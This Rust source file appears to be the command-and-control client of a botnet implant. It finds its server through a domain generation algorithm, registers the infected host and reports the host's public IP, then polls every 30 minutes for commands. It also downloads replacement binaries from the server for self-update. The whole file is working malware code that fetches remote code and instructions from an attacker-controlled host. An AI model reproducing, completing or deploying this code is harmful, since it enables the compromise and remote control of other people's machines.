use reqwest::StatusCode;

use std::{
    net::IpAddr,
    sync::mpsc::{channel, Receiver, Sender},
};

use bytes::Bytes;
use serde::{Deserialize, Serialize};

use crate::dga::Dga;
use crate::{SharedMeta, CERT};
use protocol::Message;

#[derive(Debug)]
pub enum ClientMessage {
    Message(Message),
    Update(Bytes),
}

type MessageTx = Sender<ClientMessage>;
pub type MessageRx = Receiver<ClientMessage>;

pub struct Client {
    client: reqwest::blocking::Client,
    message_tx: MessageTx,
    meta: SharedMeta,
    dga: Box<dyn Dga + Send + Sync>,
}

#[derive(Debug)]
pub enum ClientError {
    Unregistered,
    ReqwestError(reqwest::Error),
    InvalidResponse(&'static str),
}

impl From<reqwest::Error> for ClientError {
    fn from(value: reqwest::Error) -> Self {
        ClientError::ReqwestError(value)
    }
}

pub type ClientResult<T> = Result<T, ClientError>;

#[derive(Serialize, Deserialize, Debug, Clone)]
struct MyIp {
    ip: IpAddr,
    country: String,
    cc: String,
}

impl Client {
    pub fn new(shared_meta: SharedMeta, dga: Box<dyn Dga + Sync + Send>) -> (Self, MessageRx) {
        let cert = reqwest::Certificate::from_pem(CERT).unwrap();
        let client = reqwest::blocking::ClientBuilder::new()
            .add_root_certificate(cert)
            .danger_accept_invalid_hostnames(true)
            .tls_built_in_root_certs(false)
            .https_only(true)
            .build()
            .unwrap();

        let (message_tx, message_rx) = channel();

        (
            Self {
                client,
                message_tx,
                meta: shared_meta,
                dga,
            },
            message_rx,
        )
    }

    fn fetch_ip(&mut self) -> ClientResult<IpAddr> {
        let url = "https://api.myip.com/";
        let ip: MyIp = self.client.get(url).send()?.json()?;

        Ok(ip.ip)
    }

    fn register(&mut self, addr: &str) -> ClientResult<String> {
        let endpoint = "node/register";
        let url = format!("{}/{}", addr, endpoint);

        let ip = self.fetch_ip().ok();

        let mut request = self.client.post(url).body("");

        match ip {
            Some(ip) => {
                request = request.header("X-Forwarded-For", ip.to_string());
            }
            None => (),
        }

        let response = request.send()?;

        if response.status() != StatusCode::OK {
            return Err(ClientError::InvalidResponse("Invalid status code"));
        }

        match response.text() {
            Ok(id) if id.len() >= 1 => Ok(id),
            Ok(_) => Err(ClientError::InvalidResponse("Empty id")),
            Err(err) => Err(ClientError::ReqwestError(err)),
        }
    }

    fn refresh(&mut self, addr: &str, id: &str) -> ClientResult<()> {
        let endpoint = "node/refresh";
        let url = format!("{}/{}", addr, endpoint);
        let res = self.client.post(url).body("").header("X-id", id).send()?;

        match res.status() {
            StatusCode::OK => Ok(()),
            StatusCode::UNAUTHORIZED => Err(ClientError::Unregistered),
            _ => Err(ClientError::InvalidResponse("Invalid Status Code")),
        }
    }

    fn message(&mut self, addr: &str, id: &str) -> ClientResult<Option<Message>> {
        let endpoint = "node/message";
        let url = format!("{}/{}", addr, endpoint);
        let res = self.client.post(url).body("").header("X-id", id).send()?;

        match res.status() {
            StatusCode::UNAUTHORIZED => Err(ClientError::Unregistered),
            StatusCode::NO_CONTENT => Ok(None),
            StatusCode::OK => match res.text() {
                Ok(text) if text.len() == 0 => Err(ClientError::InvalidResponse("Empty message")),
                Ok(text) => {
                    let message: Message = serde_json::from_str(&text)
                        .map_err(|_| ClientError::InvalidResponse("Malformated body"))?;

                    Ok(Some(message))
                }
                Err(_) => Err(ClientError::InvalidResponse("Malformated body")),
            },
            _ => Err(ClientError::InvalidResponse("Invalid Status Code")),
        }
    }

    fn version(&mut self, addr: &str, _id: &str) -> ClientResult<u64> {
        let endpoint = "version";
        let url = format!("{}/{}", addr, endpoint);
        let res = self.client.get(url).send()?;

        match res.status() {
            StatusCode::OK => {
                let body = res
                    .text()
                    .map_err(|_| ClientError::InvalidResponse("Non utf-8 body"))?;
                let body: u64 = u64::from_str_radix(&body, 10)
                    .map_err(|_| ClientError::InvalidResponse("Non numeric body"))?;
                Ok(body)
            }
            _ => Err(ClientError::InvalidResponse("Invalid Status Code")),
        }
    }

    fn binary(&mut self, addr: &str) -> ClientResult<Bytes> {
        let endpoint = "binary";
        let url = format!("{}/{}", addr, endpoint);
        let arch = (*self.meta.try_read().unwrap()).system_data.arch.clone();

        let res = self.client.get(url).query(&["arch", &arch]).send()?;

        match res.status() {
            StatusCode::OK => return res.bytes().map_err(|err| ClientError::ReqwestError(err)),
            _ => Err(ClientError::InvalidResponse("Invalid Status Code")),
        }
    }

    pub fn main(mut self) {
        let mut addr: Option<String> = None;
        let mut id: Option<String> = None;

        let handle_error =
            |addr: &mut Option<String>, id: &mut Option<String>, err: ClientError| {
                // Didn't figure out how to negate it.
                if let ClientError::Unregistered = err {
                } else {
                    *addr = None;
                }
                *id = None;
            };

        loop {
            match addr.as_mut() {
                Some(some_addr) => match id.as_mut() {
                    Some(some_id) => match self.version(&some_addr, &some_id) {
                        Ok(version) => {
                            if version > (*self.meta.try_read().unwrap()).version {
                                match self.binary(&some_addr) {
                                    Ok(binary) => {
                                        self.message_tx.send(ClientMessage::Update(binary)).unwrap()
                                    }
                                    Err(err) => {
                                        handle_error(&mut addr, &mut id, err);
                                    }
                                }
                            } else {
                                match self.message(&some_addr, &some_id) {
                                    Ok(message) => {
                                        if let Some(message) = message {
                                            self.message_tx
                                                .send(ClientMessage::Message(message))
                                                .unwrap();
                                        }
                                    }
                                    Err(err) => {
                                        handle_error(&mut addr, &mut id, err);
                                    }
                                }
                            }
                        }
                        Err(err) => {
                            handle_error(&mut addr, &mut id, err);
                        }
                    },
                    None => match self.register(&some_addr) {
                        Ok(new_id) => id = Some(new_id),
                        Err(_) => addr = None,
                    },
                },
                None => addr = self.dga.get_domain(),
            }
            std::thread::sleep(std::time::Duration::new(60 * 30, 0))
        }
    }
}
